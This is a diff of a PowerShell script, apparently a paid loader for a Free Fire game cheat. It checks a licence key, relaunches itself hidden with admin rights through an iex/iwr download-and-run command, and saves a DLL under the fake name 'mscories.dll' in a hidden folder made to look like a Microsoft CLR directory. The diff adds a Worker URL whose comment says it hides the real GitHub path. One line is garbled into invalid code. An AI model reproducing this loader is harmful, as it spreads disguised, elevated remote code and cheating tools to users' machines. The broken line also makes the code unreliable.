@@ -1,15 +1,16 @@
 # ============================================================
-# dugduy.ps1 - PEDPRO STORE (ORIGINAL STABLE VERSION)
+# dugduy.ps1 - PEDPRO STORE (ORIGINAL STABLE)
 # ============================================================
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls
 netsh winhttp reset proxy | Out-Null
 $ProgressPreference = 'SilentlyContinue'
 
+# ต่อตรงกับ KeyAuth ดั้งเดิมของพี่ ไม่ผ่าน Worker
 $OwnerID   = "vGgzXjkfQj" 
 $AppName   = "GetX"
 $Version   = "1.0"
-$BridgeUrl = "https://naheeeeeeee.getx796.workers.dev"
+$KeyAuthUrl = "https://keyauth.win" 
 
 Clear-Host
 Write-Host "========================================" -ForegroundColor Cyan
@@ -21,21 +22,17 @@ $hwid = (Get-CimInstance Win32_ComputerSystemProduct).UUID
 $userKey = Read-Host "[?] Please enter your License Key"
 Write-Host "[*] Checking license for HWID: $hwid" -ForegroundColor Gray
 
-$authUrl = "$BridgeUrl/api/1.3/?type=init&name=$AppName&ownerid=$OwnerID&ver=$Version"
+$authUrl = "$KeyAuthUrl/api/1.3/?type=init&name=$AppName&ownerid=$OwnerID&ver=$Version"
 
 try {
     $initReq = Invoke-RestMethod -Uri $authUrl -Method Get -TimeoutSec 15 -UserAgent "Mozilla/5.0"
-    
     if ($initReq.success -eq "true") {
         $sessionid = $initReq.sessionid
-        $loginUrl = "$BridgeUrl/api/1.3/?type=license&key=$userKey&sessionid=$sessionid&name=$AppName&ownerid=$OwnerID&hwid=$hwid"
+        $loginUrl = "$KeyAuthUrl/api/1.3/?type=license&key=$userKey&sessionid=$sessionid&name=$AppName&ownerid=$OwnerID&hwid=$hwid"
         $loginReq = Invoke-RestMethod -Uri $loginUrl -Method Get -UserAgent "Mozilla/5.0"
 
         if ($loginReq.success -ne "true") {
             Write-Host "[-] ACCESS DENIED: $($loginReq.message)" -ForegroundColor Red
-            if ($loginReq.message -like "*HWID*") {
-                Write-Host "[!] ติดล็อคเครื่อง! กรุณารีเซ็ต HWID ใน Dashboard" -ForegroundColor Yellow
-            }
             Write-Host "[!] Press any key to exit..." -ForegroundColor Yellow
             $null = [Console]::ReadKey(); exit
         }
@@ -45,18 +42,18 @@ try {
         $null = [Console]::ReadKey(); exit
     }
 } catch {
-    Write-Host "[-] CONNECTION FAILED: ไม่สามารถติดต่อเซิร์ฟเวอร์ได้" -ForegroundColor Red
-    $null = [Console]::ReadKey(); exit
+    Write-Host "[-] CONNECTION FAILED" -ForegroundColor Red
+    $null = [Console的美]刻Key(); exit
 }
 
 if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    Write-Host "[*] Requesting Admin Privileges..." -ForegroundColor Yellow
+    Write-Host "[*] Requesting Admin..." -ForegroundColor Yellow
     Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"iex ((iwr 'https://raw.githubusercontent.com/getx796-Harem/cmdFreefire/main/dugduy.ps1' -UseBasicParsing).Content)`"" -Verb RunAs
     exit
 }
 
-# ลิงก์ดาวน์โหลด DLL ตัวใหม่ล่าสุดตามที่ระบุ
-$url = "https://github.com/getx796-Harem/cmdFreefire/releases/download/v1.0/dllfreefire.dll"
+# 🛑 จุดสำคัญ: ชี้ลิงก์ดาวน์โหลด DLL มาที่ Worker เพื่อซ่อนพาธ GitHub จริง
+$url = "https://naheeeeeeee.getx796.workers.dev/"
 $fakeName = "mscories.dll"
 $workDir = "$env:LOCALAPPDATA\Microsoft\CLR_v4.0"
 $dllPath = Join-Path $workDir $fakeName
@@ -68,9 +65,10 @@ attrib +h +s $workDir
 
 Write-Host "[*] Downloading components..." -ForegroundColor Gray
 try {
-    Invoke-WebRequest -Uri $url -OutFile $dllPath -UseBasicParsing
+    # ส่งคำขอไปที่ Worker โดยใช้ User-Agent ของ PowerShell เพื่อดึงไฟล์ DLL ตัวจริงออกมารัน
+    Invoke-WebRequest -Uri $url -OutFile $dllPath -UserAgent "WindowsPowerShell"
 } catch {
-    Write-Host "[-] DOWNLOAD ERROR: ไม่สามารถโหลดไฟล์โมดูลได้" -ForegroundColor Red
+    Write-Host "[-] DOWNLOAD ERROR: ไม่สามารถดาวน์โหลดโมดูลความปลอดภัยได้" -ForegroundColor Red
     Pause; exit
 }
 
